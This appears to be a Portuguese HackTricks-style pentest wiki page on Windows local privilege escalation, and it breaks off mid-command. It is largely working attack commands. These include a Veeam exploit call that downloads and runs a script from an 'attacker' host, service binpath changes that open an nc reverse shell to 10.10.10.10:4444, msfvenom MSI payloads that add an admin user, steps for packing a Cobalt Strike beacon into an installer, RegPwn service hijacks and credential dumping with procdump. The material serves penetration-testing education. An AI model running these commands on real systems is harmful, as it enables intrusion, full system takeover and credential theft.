# Escalação de Privilégios Locais no Windows

{{#include ../../banners/hacktricks-training.md}}

### **Melhor ferramenta para procurar vetores de escalação de privilégios locais no Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoria Inicial do Windows

### Access Tokens

**Se você não sabe o que são Windows Access Tokens, leia a página a seguir antes de continuar:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consulte a página a seguir para obter mais informações sobre ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Níveis de Integridade

**Se você não sabe o que são níveis de integridade no Windows, leia a página a seguir antes de continuar:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Controles de Segurança do Windows

Há diferentes elementos no Windows que podem **impedir você de enumerar o sistema**, executar executáveis ou até mesmo **detectar suas atividades**. Você deve **ler** a **página** a seguir e **enumerar** todos esses **mecanismos** de **defesa** antes de iniciar a enumeração de escalação de privilégios:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Proteção de Administrador / Elevação silenciosa de UIAccess

Processos UIAccess iniciados por meio de `RAiLaunchAdminProcess` podem ser abusados para alcançar High IL sem prompts quando as verificações de secure-path do AppInfo são contornadas. Consulte aqui o fluxo de trabalho dedicado para contornar UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

A propagação do registro de acessibilidade do Secure Desktop pode ser abusada para realizar uma gravação arbitrária no registro como SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Compilações recentes do Windows também introduziram um caminho de **LPE por porta arbitrária SMB**, no qual uma autenticação NTLM local privilegiada é refletida por meio de uma conexão TCP SMB reutilizada:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informações do Sistema

### Enumeração de informações da versão

Verifique se a versão do Windows possui alguma vulnerabilidade conhecida (verifique também os patches aplicados).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits de Versão

Este [site](https://msrc.microsoft.com/update-guide/vulnerability) é útil para pesquisar informações detalhadas sobre vulnerabilidades de segurança da Microsoft. Este banco de dados possui mais de 4.700 vulnerabilidades de segurança, mostrando a **massive attack surface** que um ambiente Windows apresenta.

**No sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas possui o watson incorporado)_

**Localmente com informações do sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repos do Github de exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ambiente

Alguma informação de credencial/Juicy salva nas variáveis de ambiente?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Histórico do PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Arquivos de transcrição do PowerShell

Você pode aprender como ativar isso em [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Os detalhes das execuções do pipeline do PowerShell são registrados, abrangendo comandos executados, invocações de comandos e partes de scripts. No entanto, os detalhes completos da execução e os resultados da saída podem não ser capturados.

Para habilitar isso, siga as instruções na seção "Transcript files" da documentação, optando por **"Module Logging"** em vez de **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Para visualizar os últimos 15 eventos dos logs do PowerShell, você pode executar:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Um registro completo da atividade e de todo o conteúdo da execução do script é capturado, garantindo que cada bloco de código seja documentado à medida que é executado. Esse processo preserva uma trilha de auditoria abrangente de cada atividade, valiosa para análises forenses e para a análise de comportamentos maliciosos. Ao documentar toda a atividade no momento da execução, são fornecidas informações detalhadas sobre o processo.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Os eventos de logging do Script Block podem ser encontrados no Windows Event Viewer no caminho: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Para visualizar os últimos 20 eventos, você pode usar:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Configurações da Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unidades
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Você pode comprometer o sistema se as atualizações não forem solicitadas usando http**S**, mas sim http.

Você começa verificando se a rede usa uma atualização WSUS não SSL executando o seguinte no cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ou o seguinte no PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Se você receber uma resposta como uma destas:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ou `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` for igual a `1`.

Então, **é explorável.** Se o último registro for igual a 0, a entrada do WSUS será ignorada.

Para explorar essas vulnerabilidades, você pode usar ferramentas como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Estes são scripts de exploits MiTM weaponized para injetar updates 'fake' no tráfego WSUS sem SSL.

Leia a pesquisa aqui:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Leia o relatório completo aqui**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basicamente, esta é a falha explorada por este bug:

> Se tivermos o poder de modificar o proxy do nosso usuário local, e o Windows Updates usar o proxy configurado nas configurações do Internet Explorer, teremos, portanto, o poder de executar o [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nosso próprio tráfego e executar código como um usuário elevado em nosso asset.
>
> Além disso, como o serviço WSUS usa as configurações do usuário atual, ele também usará o armazenamento de certificados desse usuário. Se gerarmos um certificado autoassinado para o hostname do WSUS e adicionarmos esse certificado ao armazenamento de certificados do usuário atual, poderemos interceptar o tráfego WSUS HTTP e HTTPS. O WSUS não usa mecanismos semelhantes ao HSTS para implementar um tipo de validação trust-on-first-use no certificado. Se o certificado apresentado for confiável para o usuário e tiver o hostname correto, ele será aceito pelo serviço.

Você pode explorar esta vulnerabilidade usando a ferramenta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (assim que for liberada).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Muitos agentes corporativos expõem uma superfície IPC em localhost e um canal de update privilegiado. Se o enrollment puder ser induzido a usar um servidor do atacante e o updater confiar em uma CA root rogue ou em verificações fracas de signer, um usuário local poderá enviar um MSI malicioso que o serviço SYSTEM instalará. Veja uma técnica generalizada (baseada na cadeia stAgentSvc da Netskope – CVE-2025-0309) aqui:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

O Veeam B&R < `11.0.1.1261` expõe um serviço localhost em **TCP/9401** que processa mensagens controladas pelo atacante, permitindo comandos arbitrários como **NT AUTHORITY\SYSTEM**.

- **Recon**: confirme o listener e a versão, por exemplo, `netstat -ano | findstr 9401` e `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: coloque um PoC como `VeeamHax.exe` com as DLLs necessárias do Veeam no mesmo diretório e, em seguida, dispare um payload SYSTEM pelo socket local:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
O serviço executa o comando como SYSTEM.
## KrbRelayUp

Existe uma vulnerabilidade de **escalada local de privilégios** em ambientes de **domínio** Windows sob condições específicas. Essas condições incluem ambientes onde a assinatura **LDAP** não é imposta, os usuários possuem direitos próprios que permitem configurar **Resource-Based Constrained Delegation (RBCD)** e existe a possibilidade de os usuários criarem computadores no domínio. É importante observar que esses **requisitos** são atendidos usando as configurações padrão.

Encontre o **exploit em** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Para obter mais informações sobre o fluxo do ataque, consulte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** esses 2 registros estiverem **habilitados** (o valor for **0x1**), usuários com qualquer privilégio poderão **instalar** (executar) arquivos `*.msi` como NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se você tiver uma sessão do meterpreter, poderá automatizar esta técnica usando o módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Use o comando `Write-UserAddMSI` do power-up para criar, dentro do diretório atual, um binário MSI do Windows para escalar privilégios. Este script grava um instalador MSI pré-compilado que solicita a adição de um usuário/grupo (portanto, você precisará de acesso GIU):
```
Write-UserAddMSI
```
Apenas execute o binário criado para escalar privilégios.

### MSI Wrapper

Leia este tutorial para aprender a criar um MSI wrapper usando estas ferramentas. Observe que você pode encapsular um arquivo "**.bat**" se **quiser apenas** **executar** **linhas de comando**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Gere** com Cobalt Strike ou Metasploit um **novo payload TCP EXE do Windows** em `C:\privesc\beacon.exe`
- Abra o **Visual Studio**, selecione **Create a new project** e digite "installer" na caixa de pesquisa. Selecione o projeto **Setup Wizard** e clique em **Next**.
- Dê um nome ao projeto, como **AlwaysPrivesc**, use **`C:\privesc`** como localização, selecione **place solution and project in the same directory** e clique em **Create**.
- Continue clicando em **Next** até chegar à etapa 3 de 4 (escolher os arquivos a serem incluídos). Clique em **Add** e selecione o payload Beacon que você acabou de gerar. Em seguida, clique em **Finish**.
- Destaque o projeto **AlwaysPrivesc** no **Solution Explorer** e, em **Properties**, altere **TargetPlatform** de **x86** para **x64**.
- Há outras propriedades que você pode alterar, como **Author** e **Manufacturer**, que podem fazer o aplicativo instalado parecer mais legítimo.
- Clique com o botão direito no projeto e selecione **View > Custom Actions**.
- Clique com o botão direito em **Install** e selecione **Add Custom Action**.
- Clique duas vezes em **Application Folder**, selecione o arquivo **beacon.exe** e clique em **OK**. Isso garantirá que o payload Beacon seja executado assim que o installer for executado.
- Em **Custom Action Properties**, altere **Run64Bit** para **True**.
- Por fim, **compile-o**.
- Se o aviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` for exibido, certifique-se de definir a plataforma como x64.

### Instalação do MSI

Para executar a **instalação** do arquivo `.msi` malicioso em **segundo plano:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Para explorar esta vulnerabilidade, você pode usar: _exploit/windows/local/always_install_elevated_

## Antivírus e Detectores

### Configurações de Auditoria

Essas configurações determinam o que está sendo **registrado**, portanto, você deve prestar atenção.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding: é interessante saber para onde os logs são enviados
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

O **LAPS** foi projetado para o **gerenciamento de senhas de Administrador local**, garantindo que cada senha seja **única, aleatória e atualizada regularmente** nos computadores ingressados em um domínio. Essas senhas são armazenadas com segurança no Active Directory e só podem ser acessadas por usuários que receberam permissões suficientes por meio de ACLs, permitindo que visualizem as senhas de administrador local se estiverem autorizados.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Se estiver ativo, **senhas em texto simples são armazenadas no LSASS** (Local Security Authority Subsystem Service).\
[**Mais informações sobre WDigest nesta página**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Proteção do LSA

A partir do **Windows 8.1**, a Microsoft introduziu uma proteção aprimorada para a Autoridade de Segurança Local (LSA) para **bloquear** tentativas de processos não confiáveis de **ler sua memória** ou injetar código, protegendo ainda mais o sistema.\
[**Mais informações sobre a Proteção do LSA aqui**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

O **Credential Guard** foi introduzido no **Windows 10**. Seu objetivo é proteger as credenciais armazenadas em um dispositivo contra ameaças como ataques pass-the-hash.| [**Mais informações sobre o Credentials Guard aqui.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Credenciais em Cache

**As credenciais de domínio** são autenticadas pela **Autoridade de Segurança Local** (LSA) e utilizadas pelos componentes do sistema operacional. Quando os dados de **logon** de um usuário são autenticados por um pacote de segurança registrado, as credenciais de domínio do usuário normalmente são estabelecidas.\
[**Mais informações sobre Credenciais em Cache aqui**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Usuários e Grupos

### Enumerar Usuários e Grupos

Você deve verificar se algum dos grupos aos quais você pertence possui permissões interessantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupos privilegiados

Se você **pertence a algum grupo privilegiado, pode conseguir escalar privilégios**. Saiba mais sobre grupos privilegiados e como abusar deles para escalar privilégios aqui:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulação de tokens

**Saiba mais** sobre o que é um **token** nesta página: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulte a página a seguir para **aprender sobre tokens interessantes** e como abusar deles:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Usuários conectados / Sessões
```bash
qwinsta
klist sessions
```
### Pastas pessoais
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Política de senhas
```bash
net accounts
```
### Obter o conteúdo da área de transferência
```bash
powershell -command "Get-Clipboard"
```
## Processos em execução

### Permissões de arquivos e pastas

Antes de tudo, ao listar os processos, **verifique se há senhas na linha de comando do processo**.\
Verifique se é possível **sobrescrever algum binário em execução** ou se você tem permissões de gravação na pasta do binário para explorar possíveis [**ataques de DLL Hijacking**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Sempre verifique se há [**electron/cef/chromium debuggers** em execução; você pode explorá-los para escalar privilégios](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Verificando as permissões dos binários dos processos**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Verificando as permissões das pastas dos binários dos processos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Mineração de senhas na memória

Você pode criar um dump de memória de um processo em execução usando **procdump** do sysinternals. Serviços como FTP têm as **credenciais em texto claro na memória**; tente fazer o dump da memória e ler as credenciais.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Aplicativos GUI inseguros

**Aplicativos executados como SYSTEM podem permitir que um usuário inicie um CMD ou navegue pelos diretórios.**

Exemplo: "Windows Help and Support" (Windows + F1), pesquise por "command prompt" e clique em "Click to open Command Prompt"

## Serviços

Service Triggers permitem que o Windows inicie um serviço quando determinadas condições ocorrem (atividade de named pipe/endpoint RPC, eventos ETW, disponibilidade de IP, chegada de dispositivo, atualização de GPO etc.). Mesmo sem direitos de SERVICE_START, muitas vezes é possível iniciar serviços privilegiados acionando seus triggers. Consulte as técnicas de enumeração e ativação aqui:

-
{{#ref}}
service-triggers.md
{{#endref}}

Obtenha uma lista de serviços:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissões

Você pode usar **sc** para obter informações sobre um serviço
```bash
sc qc <service_name>
```
Recomenda-se ter o binário **accesschk** do _Sysinternals_ para verificar o nível de privilégio necessário para cada serviço.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Recomenda-se verificar se "Authenticated Users" pode modificar algum serviço:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Você pode baixar o accesschk.exe para XP aqui](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Habilitar serviço

Se você estiver enfrentando este erro (por exemplo, com SSDPSRV):

_O erro de sistema 1058 ocorreu._\
_O serviço não pode ser iniciado porque está desabilitado ou porque não há dispositivos habilitados associados a ele._

Você pode habilitá-lo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Leve em consideração que o serviço upnphost depende do SSDPSRV para funcionar (no XP SP1)**

**Outra solução alternativa** para esse problema é executar:
```
sc.exe config usosvc start= auto
```
### **Modificar o caminho do binário do serviço**

No cenário em que o grupo "Authenticated users" possui **SERVICE_ALL_ACCESS** em um serviço, é possível modificar o binário executável do serviço. Para modificar e executar **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Reiniciar serviço
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Os privilégios podem ser escalados por meio de várias permissões:

- **SERVICE_CHANGE_CONFIG**: Permite a reconfiguração do binário do serviço.
- **WRITE_DAC**: Permite a reconfiguração de permissões, possibilitando alterar as configurações do serviço.
- **WRITE_OWNER**: Permite adquirir a propriedade e reconfigurar permissões.
- **GENERIC_WRITE**: Herda a capacidade de alterar as configurações do serviço.
- **GENERIC_ALL**: Também herda a capacidade de alterar as configurações do serviço.

Para a detecção e exploração dessa vulnerabilidade, o _exploit/windows/local/service_permissions_ pode ser utilizado.

### Permissões fracas nos binários dos serviços

Se um serviço for executado como **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ou por uma conta de domínio privilegiada, mas **usuários com poucos privilégios puderem modificar o EXE do serviço ou sua pasta pai**, o serviço geralmente poderá ser sequestrado **substituindo o binário e reiniciando o serviço**.

**Verifique se você pode modificar o binário executado por um serviço** ou se possui **permissões de escrita na pasta** onde o binário está localizado ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Você pode obter todos os binários executados por um serviço usando **wmic** (não no system32) e verificar suas permissões usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Você também pode usar **sc** e **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Procure ACLs perigosas concedidas a **`Everyone`**, **`BUILTIN\Users`** ou **`Authenticated Users`**, especialmente **`(F)`**, **`(M)`** ou **`(W)`** no executável do serviço ou no diretório que o contém. Um fluxo prático de abuso é:

1. Confirme a conta do serviço e o caminho do executável com `sc qc <service_name>`.
2. Confirme que o binário pode ser gravado com `icacls <path>`.
3. Substitua o binário do serviço por um payload ou por um binário de serviço malicioso válido.
4. Reinicie o serviço com `sc stop <service_name> && sc start <service_name>` (ou aguarde uma reinicialização / service trigger).

Verificações automatizadas úteis:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Se o serviço não permitir que um usuário normal o reinicie, verifique se ele é iniciado automaticamente na inicialização, possui uma ação de falha que o relança ou pode ser acionado indiretamente pelo aplicativo que o utiliza.

### Permissões de modificação do registro de serviços

Você deve verificar se pode modificar algum registro de serviço.\
Você pode **verificar** suas **permissões** sobre um **registro** de serviço executando:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Deve ser verificado se **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** possuem permissões `FullControl`. Nesse caso, o binary executado pelo service pode ser alterado.

Para alterar o Path do binary executado:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Race de symlink do Registry para escrita arbitrária de valor HKLM (ATConfig)

Alguns recursos de Accessibility do Windows criam chaves **ATConfig** por usuário que posteriormente são copiadas por um processo **SYSTEM** para uma chave de sessão HKLM. Uma **symbolic link race** no Registry pode redirecionar essa escrita privilegiada para **qualquer caminho HKLM**, fornecendo uma primitive de **value write** arbitrário em HKLM.

Localizações principais (exemplo: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lista os recursos de Accessibility instalados.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` armazena configurações controladas pelo usuário.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` é criada durante o logon/transições para o secure desktop e pode ser gravada pelo usuário.

Fluxo de abuso (CVE-2026-24291 / ATConfig):

1. Preencha o valor **HKCU ATConfig** que deseja que seja gravado pelo SYSTEM.
2. Dispare a cópia para o secure desktop (por exemplo, **LockWorkstation**), o que inicia o fluxo do AT broker.
3. **Vença a race** colocando um **oplock** em `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; quando o oplock for acionado, substitua a chave **HKLM Session ATConfig** por um **registry link** para um target HKLM protegido.
4. O SYSTEM grava o valor escolhido pelo atacante no caminho HKLM redirecionado.

Depois de obter uma escrita arbitrária de valor HKLM, faça pivot para LPE sobrescrevendo valores de configuração de services:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Escolha um service que um usuário normal possa iniciar (por exemplo, **`msiserver`**) e dispare-o após a escrita. **Nota:** a implementação pública do exploit **bloqueia a workstation** como parte da race.

Ferramentas de exemplo (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Permissões AppendData/AddSubdirectory no registro de Services

Se você tiver essa permissão sobre um registro, isso significa que **você pode criar sub-registros a partir dele**. No caso de Windows services, isso é **suficiente para executar código arbitrário:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Se o caminho para um executável não estiver entre aspas, o Windows tentará executar cada término antes de um espaço.

Por exemplo, para o caminho _C:\Program Files\Some Folder\Service.exe_, o Windows tentará executar:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste todos os caminhos de serviço sem aspas, excluindo aqueles pertencentes a serviços integrados do Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
